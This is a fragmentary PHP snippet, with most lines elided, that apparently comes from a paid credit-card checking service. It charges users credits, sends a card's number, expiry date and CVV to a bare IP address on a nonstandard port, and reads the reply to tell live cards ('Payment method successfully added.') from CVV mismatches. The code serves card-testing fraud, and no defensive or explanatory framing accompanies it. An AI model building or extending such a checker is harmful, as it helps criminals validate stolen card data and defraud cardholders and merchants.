...
if ($currentCredits < 1) { // Adjusted to 1 credit for Payflow Auth
...
$requestUrl = "http://206.206.78.217:1119/?cc={$cc}|{$month}|{$year}|{$cvv}";
...
if (stripos($response, 'Payment method successfully added.') !== false) {
    ...
    exit;
} elseif (stripos($response, 'CVV2 Mismatch') !== false) {
    $err = 'CVV2 Mismatch';
